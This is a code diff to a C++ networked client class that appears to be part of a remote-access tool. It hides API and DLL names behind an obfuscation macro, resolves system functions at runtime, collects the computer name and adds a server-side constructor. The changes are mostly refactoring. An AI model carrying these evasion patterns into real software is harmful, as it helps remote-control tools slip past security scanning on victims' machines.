@@ -2,6 +2,8 @@
 #include "External/obfuscate.h"
 #include "serialization.h"
 
+#ifdef CLIENT_RELEASE
+
 Client::Client() {
 	NetCommon::LoadWSAFunctions();
 
@@ -27,7 +29,7 @@ Client::~Client() {
 	this->Disconnect(); // disconnect incase the socket is still connected
 
 	CleanWSA();
-	ProcManager.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
+	Remote.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
 }
 
 void Client::SetRemoteComputerName() {
@@ -35,7 +37,7 @@ void Client::SetRemoteComputerName() {
 	DWORD buffSize = sizeof(buffer);
 
 	// get computer name
-	BOOL success = ProcManager.GetNative<_GetComputerNameA>((char*)HIDE("GetComputerNameA")).call(buffer, &buffSize);
+	BOOL success = Remote.GetNative<_GetComputerNameA>((char*)HIDE("GetComputerNameA")).call(buffer, &buffSize);
 
 	if ( success )
 		this->m_ComputerName = buffer;
@@ -195,10 +197,23 @@ BOOL Client::SendEncryptedMessageToServer(Server dest, ClientMessage message) {
 }
 
 BOOL Client::Disconnect() {
+	CloseSocket(this->m_UDPSocket);
 	int status = CloseSocket(this->m_TCPSocket);
-	if ( status == SOCKET_ERROR ) {
+	if ( status == SOCKET_ERROR )
 		return FALSE;
-	}
 
 	return TRUE;
 }
+
+#elif defined(SERVER_RELEASE)
+
+Client::Client(SOCKET tcp, SOCKET udp, sockaddr_in addr)
+	: AddressInfo(addr), m_TCPSocket(tcp), m_UDPSocket(udp)
+{
+	std::random_device gen;
+	std::mt19937 rng(gen());
+	std::uniform_int_distribution<std::mt19937::result_type> dist(1, 100000);
+	this->ClientUID = dist(rng);
+}
+
+#endif
